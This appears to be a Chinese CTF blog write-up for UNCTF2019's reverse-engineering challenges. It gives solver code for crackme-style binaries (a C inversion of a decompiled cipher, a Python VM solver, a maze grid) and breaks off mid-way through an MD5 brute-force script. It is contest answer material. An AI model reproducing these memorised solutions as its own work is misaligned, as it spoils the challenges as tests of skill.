<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">























  
  
  
  

  
    
    
  

  

  
    
      
    

    
  

  
    
      
    

    
  

  

  
    
    
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Comic Sans MS:300,300italic,400,400italic,700,700italic|楷体:300,300italic,400,400italic,700,700italic|Ink Free:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
  






<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.0.1">



  <link rel="icon" type="image/png" sizes="32x32" href="/images/code_32.png?v=7.0.1">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/code_16.png?v=7.0.1">








<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '7.0.1',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false,"dimmer":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="有一说一，一周的比赛真的好长啊2333 WEB题多但是啥也不会233tcl">
<meta property="og:type" content="article">
<meta property="og:title" content="UNCTF2019 Writeup">
<meta property="og:url" content="https://critizero.github.io/2019/10/28/Writeup_unctf_2019/index.html">
<meta property="og:site_name" content="Critizero&#39;s">
<meta property="og:description" content="有一说一，一周的比赛真的好长啊2333 WEB题多但是啥也不会233tcl">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://i.loli.net/2020/01/17/kJmVE9oS5raFNqD.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/reAXt4NjqHc83dI.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/2YghRc5OzjCeX1V.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/5jvZczen3gyTBQL.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/JvY41xi5TXfg7oG.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/QLnewpybBz7HUhA.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/OWaUrVQu5y1ofXY.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/KV7a4eqCrR39dpI.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/MfmFz3OGKqY4owk.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/NqCA4SXcvdFPxO3.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/vejRfaZWtP2rgO6.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/KwyL9qton8jJ6Sd.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/YvsCWNU42FVHfKm.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/jRzLbyZ231UJAvh.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/ZV8YSEHaRUn6Kbh.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/tjFhWdHULfr6peI.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/tksJmBLfDpXKU9F.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/gMwKUpJCSx6nqPj.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/5idCDqYso7AZHBx.png">
<meta property="og:image" content="https://i.loli.net/2020/01/17/WehraBSiQn8FlCX.png">
<meta property="og:updated_time" content="2019-10-28T12:39:12.023Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="UNCTF2019 Writeup">
<meta name="twitter:description" content="有一说一，一周的比赛真的好长啊2333 WEB题多但是啥也不会233tcl">
<meta name="twitter:image" content="https://i.loli.net/2020/01/17/kJmVE9oS5raFNqD.png">






  <link rel="canonical" href="https://critizero.github.io/2019/10/28/Writeup_unctf_2019/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>UNCTF2019 Writeup | Critizero's</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Critizero's</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-挖坑">

    
    
    
      
    

    

    <a href="/todo/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>挖坑</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://critizero.github.io/2019/10/28/Writeup_unctf_2019/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Critizero">
      <meta itemprop="description" content="当三日不见，刮目相看">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Critizero's">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">UNCTF2019 Writeup

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-28 20:39:11 / 修改时间：20:39:12" itemprop="dateCreated datePublished" datetime="2019-10-28T20:39:11+08:00">2019-10-28</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">评论数：</span>
                <a href="/2019/10/28/Writeup_unctf_2019/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/10/28/Writeup_unctf_2019/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>有一说一，一周的比赛真的好长啊2333</p>
<p>WEB题多但是啥也不会233tcl</p>
<a id="more"></a>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="unctf-babyre2"><a href="#unctf-babyre2" class="headerlink" title="unctf_babyre2"></a>unctf_babyre2</h2><p>虽然是个300分的题，但是由于看不出来第二个加密是啥加密，得手撸。。。还是有那么一点麻烦orz</p>
<p>ida打开可以看到，输入除了判断了<code>UNCTF{</code>和<code>}</code>，整个输入被<code>-</code>分成两个部分。</p>
<p><img src="https://i.loli.net/2020/01/17/kJmVE9oS5raFNqD.png" alt="re_babyre2.png" style="zoom:50%;"></p>
<p>前半部分输入可以直接通过动态调试得到<code>pre_part</code>的内容，然后把异或后的input的idx弄清楚以后，就得到了。</p>
<p>后半部分应该是一个常用的加密，但是不知道名字，之前某次见到过，然而脚本也没留orz直接把ida代码dump下来，然后修改一下运算逻辑，跑就是了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num[<span class="number">291</span>] =&#123;  <span class="number">27</span>,  <span class="number">93</span>,  <span class="number">66</span>,  <span class="number">43</span>,  <span class="number">13</span>,  <span class="number">5</span>,  <span class="number">72</span>,  <span class="number">230</span>,  <span class="number">53</span>,  <span class="number">22</span>,  <span class="number">158</span>,  <span class="number">181</span>,  <span class="number">187</span>,  <span class="number">227</span>,  <span class="number">36</span>,  <span class="number">15</span>,  <span class="number">19</span>,  <span class="number">192</span>,  <span class="number">89</span>,  <span class="number">150</span>,  <span class="number">90</span>,  <span class="number">18</span>,  <span class="number">43</span>,  <span class="number">224</span>,  <span class="number">143</span>,  <span class="number">33</span>,  <span class="number">140</span>,  <span class="number">82</span>,  <span class="number">222</span>,  <span class="number">146</span>,  <span class="number">18</span>,  <span class="number">132</span>,  <span class="number">163</span>,  <span class="number">226</span>,  <span class="number">110</span>,  <span class="number">123</span>,  <span class="number">118</span>,  <span class="number">162</span>,  <span class="number">15</span>,  <span class="number">81</span>,  <span class="number">147</span>,  <span class="number">169</span>,  <span class="number">120</span>,  <span class="number">171</span>,  <span class="number">95</span>,  <span class="number">94</span>,  <span class="number">22</span>,  <span class="number">130</span>,  <span class="number">114</span>,  <span class="number">130</span>,  <span class="number">38</span>,  <span class="number">209</span>,  <span class="number">38</span>,  <span class="number">212</span>,  <span class="number">9</span>,  <span class="number">191</span>,  <span class="number">116</span>,  <span class="number">218</span>,  <span class="number">167</span>,  <span class="number">62</span>,  <span class="number">153</span>,  <span class="number">2</span>,  <span class="number">101</span>,  <span class="number">195</span>,  <span class="number">179</span>,  <span class="number">173</span>,  <span class="number">224</span>,  <span class="number">90</span>,  <span class="number">171</span>,  <span class="number">122</span>,  <span class="number">131</span>,  <span class="number">147</span>,  <span class="number">63</span>,  <span class="number">164</span>,  <span class="number">17</span>,  <span class="number">61</span>,  <span class="number">142</span>,  <span class="number">13</span>,  <span class="number">223</span>,  <span class="number">90</span>,  <span class="number">113</span>,  <span class="number">8</span>,  <span class="number">58</span>,  <span class="number">200</span>,  <span class="number">244</span>,  <span class="number">144</span>,  <span class="number">22</span>,  <span class="number">27</span>,  <span class="number">136</span>,  <span class="number">198</span>,  <span class="number">80</span>,  <span class="number">111</span>,  <span class="number">209</span>,  <span class="number">164</span>,  <span class="number">179</span>,  <span class="number">115</span>,  <span class="number">123</span>,  <span class="number">130</span>,  <span class="number">191</span>,  <span class="number">178</span>,  <span class="number">95</span>,  <span class="number">148</span>,  <span class="number">222</span>,  <span class="number">202</span>,  <span class="number">90</span>,  <span class="number">94</span>,  <span class="number">171</span>,  <span class="number">37</span>,  <span class="number">190</span>,  <span class="number">140</span>,  <span class="number">27</span>,  <span class="number">128</span>,  <span class="number">101</span>,  <span class="number">158</span>,  <span class="number">236</span>,  <span class="number">90</span>,  <span class="number">55</span>,  <span class="number">42</span>,  <span class="number">117</span>,  <span class="number">44</span>,  <span class="number">45</span>,  <span class="number">186</span>,  <span class="number">86</span>,  <span class="number">208</span>,  <span class="number">186</span>,  <span class="number">58</span>,  <span class="number">182</span>,  <span class="number">148</span>,  <span class="number">129</span>,  <span class="number">112</span>,  <span class="number">135</span>,  <span class="number">117</span>,  <span class="number">61</span>,  <span class="number">72</span>,  <span class="number">99</span>,  <span class="number">125</span>,  <span class="number">82</span>,  <span class="number">129</span>,  <span class="number">57</span>,  <span class="number">181</span>,  <span class="number">35</span>,  <span class="number">212</span>,  <span class="number">211</span>,  <span class="number">221</span>,  <span class="number">75</span>,  <span class="number">217</span>,  <span class="number">184</span>,  <span class="number">53</span>,  <span class="number">163</span>,  <span class="number">202</span>,  <span class="number">64</span>,  <span class="number">119</span>,  <span class="number">82</span>,  <span class="number">124</span>,  <span class="number">158</span>,  <span class="number">108</span>,  <span class="number">66</span>,  <span class="number">216</span>,  <span class="number">83</span>,  <span class="number">111</span>,  <span class="number">234</span>,  <span class="number">46</span>,  <span class="number">12</span>,  <span class="number">154</span>,  <span class="number">243</span>,  <span class="number">42</span>,  <span class="number">106</span>,  <span class="number">213</span>,  <span class="number">234</span>,  <span class="number">107</span>,  <span class="number">147</span>,  <span class="number">47</span>,  <span class="number">24</span>,  <span class="number">92</span>,  <span class="number">190</span>,  <span class="number">150</span>,  <span class="number">180</span>,  <span class="number">38</span>,  <span class="number">15</span>,  <span class="number">219</span>,  <span class="number">159</span>,  <span class="number">7</span>,  <span class="number">48</span>,  <span class="number">175</span>,  <span class="number">147</span>,  <span class="number">52</span>,  <span class="number">39</span>,  <span class="number">142</span>,  <span class="number">10</span>,  <span class="number">202</span>,  <span class="number">83</span>,  <span class="number">183</span>,  <span class="number">201</span>,  <span class="number">143</span>,  <span class="number">155</span>,  <span class="number">64</span>,  <span class="number">135</span>,  <span class="number">84</span>,  <span class="number">80</span>,  <span class="number">83</span>,  <span class="number">30</span>,  <span class="number">85</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">135</span>,  <span class="number">201</span>,  <span class="number">94</span>,  <span class="number">120</span>,  <span class="number">160</span>,  <span class="number">63</span>,  <span class="number">102</span>,  <span class="number">8</span>,  <span class="number">176</span>,  <span class="number">9</span>,  <span class="number">110</span>,  <span class="number">131</span>,  <span class="number">229</span>,  <span class="number">108</span>,  <span class="number">35</span>,  <span class="number">230</span>,  <span class="number">116</span>,  <span class="number">131</span>,  <span class="number">1</span>,  <span class="number">164</span>,  <span class="number">127</span>,  <span class="number">98</span>,  <span class="number">57</span>,  <span class="number">9</span>,  <span class="number">148</span>,  <span class="number">50</span>,  <span class="number">211</span>,  <span class="number">136</span>,  <span class="number">147</span>,  <span class="number">97</span>,  <span class="number">194</span>,  <span class="number">198</span>,  <span class="number">97</span>,  <span class="number">107</span>,  <span class="number">40</span>,  <span class="number">199</span>,  <span class="number">97</span>,  <span class="number">221</span>,  <span class="number">219</span>,  <span class="number">144</span>,  <span class="number">169</span>,  <span class="number">213</span>,  <span class="number">216</span>,  <span class="number">138</span>,  <span class="number">164</span>,  <span class="number">160</span>,  <span class="number">101</span>,  <span class="number">193</span>,  <span class="number">53</span>,  <span class="number">65</span>,  <span class="number">186</span>,  <span class="number">207</span>,  <span class="number">74</span>,  <span class="number">71</span>,  <span class="number">202</span>,  <span class="number">175</span>,  <span class="number">81</span>,  <span class="number">225</span>,  <span class="number">114</span>,  <span class="number">90</span>,  <span class="number">191</span>,  <span class="number">30</span>,  <span class="number">179</span>,  <span class="number">122</span>,  <span class="number">128</span>,  <span class="number">242</span>,  <span class="number">122</span>,  <span class="number">203</span>,  <span class="number">37</span>,  <span class="number">230</span>,  <span class="number">152</span>,  <span class="number">150</span>,  <span class="number">27</span>,  <span class="number">83</span>,  <span class="number">68</span>,  <span class="number">216</span>,  <span class="number">60</span>,  <span class="number">172</span>,  <span class="number">18</span>,  <span class="number">177</span>,  <span class="number">100</span>,  <span class="number">71</span>,  <span class="number">53</span>,  <span class="number">0</span>,  <span class="number">255</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ROR__(x, y) (((unsigned int)(x)&gt;&gt;y)|((unsigned int)(x)&lt;&lt;(32-y)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ROL__(x, y) (((unsigned int)(x)<span class="meta-string">&lt;&lt;y)|((unsigned int)(x)&gt;&gt;(32-y)))</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>   uint8;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BYTE  uint8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE1(x)   BYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTE2(x)   BYTEn(x,  2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401500</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> __ROR__(a1, a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401511</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> __ROL__(a1, a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401B51</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v1 = (num[BYTE2(a1)] &lt;&lt; <span class="number">16</span>) | (num[BYTE1(a1)] &lt;&lt; <span class="number">8</span>) | num[(<span class="keyword">unsigned</span> __int8)a1] | (num[a1 &gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  v2 = sub_401500(v1, <span class="number">6</span>);</span><br><span class="line">  v3 = sub_401500(v1, <span class="number">8</span>) ^ v2;</span><br><span class="line">  v4 = sub_401511(v1, <span class="number">10</span>) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> v4 ^ sub_401511(v1, <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> res[<span class="number">16</span>] = &#123;<span class="number">204</span>,<span class="number">34</span>,<span class="number">127</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">39</span>,<span class="number">170</span>,<span class="number">72</span>,<span class="number">52</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">208</span>,<span class="number">15</span>,<span class="number">39</span>,<span class="number">107</span>,<span class="number">57</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> re[<span class="number">30</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		re[<span class="number">26</span>+i] = res[i*<span class="number">4</span>] &lt;&lt; <span class="number">24</span>;</span><br><span class="line">		re[<span class="number">26</span>+i] += (res[i*<span class="number">4</span>+<span class="number">1</span>] &lt;&lt; <span class="number">16</span>);</span><br><span class="line">		re[<span class="number">26</span>+i] += (res[i*<span class="number">4</span>+<span class="number">2</span>] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">		re[<span class="number">26</span>+i] += res[i*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">25</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		re[i] = re[i+<span class="number">4</span>] ^ sub_401B51(re[i+<span class="number">3</span>]^re[i+<span class="number">2</span>]^re[i+<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		re[i] = _byteswap_ulong(re[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%x "</span>,re[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h2><p>分析程序发现是个简单的对比题。</p>
<p><img src="https://i.loli.net/2020/01/17/reAXt4NjqHc83dI.png" alt="re_qgdsz.png" style="zoom:50%;"></p>
<p>char2hex函数将0-9a-f转换为十六进制的值，由两个字节组成一个字节，然后跟checkbox作比较。相等就行。打开checkbox直接抄就行。。。</p>
<h2 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h2><p>Orz，是<del>麻烦的</del>虚拟机题。。。没啥说的，静态分析就有点麻烦，结合动态调试找到主要逻辑就行。</p>
<p><img src="https://i.loli.net/2020/01/17/2YghRc5OzjCeX1V.png" alt="re_easyvm.png" style="zoom:50%;"></p>
<p>程序是单字节判断的，（应该可以用pintools来单字节爆破2333），就是先减去自己的序号，然后跟0xCD异或，在跟一个中间量异或，最后中间量跟一个数据表中的数字异或，要求结果为0。实际上中间量就是上一次的数据表。调试拿到数据表以后反写逻辑就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0xf4</span>,<span class="number">0x0a</span>,<span class="number">0xf7</span>,<span class="number">0x64</span>,<span class="number">0x99</span>,<span class="number">0x78</span>,<span class="number">0x9e</span>,<span class="number">0x7d</span>,</span><br><span class="line">     <span class="number">0xea</span>,<span class="number">0x7b</span>,<span class="number">0x9e</span>,<span class="number">0x7b</span>,<span class="number">0x9f</span>,<span class="number">0x7e</span>,<span class="number">0xeb</span>,<span class="number">0x71</span>,</span><br><span class="line">     <span class="number">0xe8</span>,<span class="number">0x00</span>,<span class="number">0xe8</span>,<span class="number">0x07</span>,<span class="number">0x98</span>,<span class="number">0x19</span>,<span class="number">0xf4</span>,<span class="number">0x25</span>,</span><br><span class="line">     <span class="number">0xf3</span>,<span class="number">0x21</span>,<span class="number">0xa4</span>,<span class="number">0x2f</span>,<span class="number">0xf4</span>,<span class="number">0x2f</span>,<span class="number">0xa6</span>,<span class="number">0x7c</span>]</span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line">mid = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    b = a[i] ^ <span class="number">0xcd</span> ^ mid</span><br><span class="line">    mid = a[i]</span><br><span class="line">    r.append(b + i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> r)</span><br></pre></td></tr></table></figure>
<h2 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h2><p>拖进ida分析发现，这个迷宫在输入路径之前就初始化好了，而且根据v9的长度以及7来看，是个7x7的迷宫。</p>
<p><img src="https://i.loli.net/2020/01/17/5jvZczen3gyTBQL.png" alt="re_easy_maze2.png" style="zoom:50%;"></p>
<p>然后就通过动态调试的到迷宫就行。</p>
<p><img src="https://i.loli.net/2020/01/17/JvY41xi5TXfg7oG.png" alt="re_easy_maze.png" style="zoom:50%;"></p>
<p>然后看图发现应该是左上和右下是两端，试试就行。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1001111</span><br><span class="line">1011001</span><br><span class="line">1110111</span><br><span class="line">0001100</span><br><span class="line">1111000</span><br><span class="line">1000111</span><br><span class="line">1111101</span><br></pre></td></tr></table></figure>
<h2 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h2><p>反汇编打开jar文件以后，可以比较明显的看到判断流程。</p>
<p>首先输入的长度为32，然后将输入与<code>flag{this_is_a_fake_flag_ahhhhh}</code>逐字节异或，然后4个一组计算md5值，与给定的md5进行比较。最开始用的全可打印字符爆破，后边发现只有<code>0123456789abcdef</code>，换了以后试了一下，飞速出结果orz</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">res = [<span class="string">"2061e19de42da6e0de934592a2de3ca0"</span>,<span class="string">"a81813dabd92cefdc6bbf28ea522d2d1"</span>,</span><br><span class="line">        <span 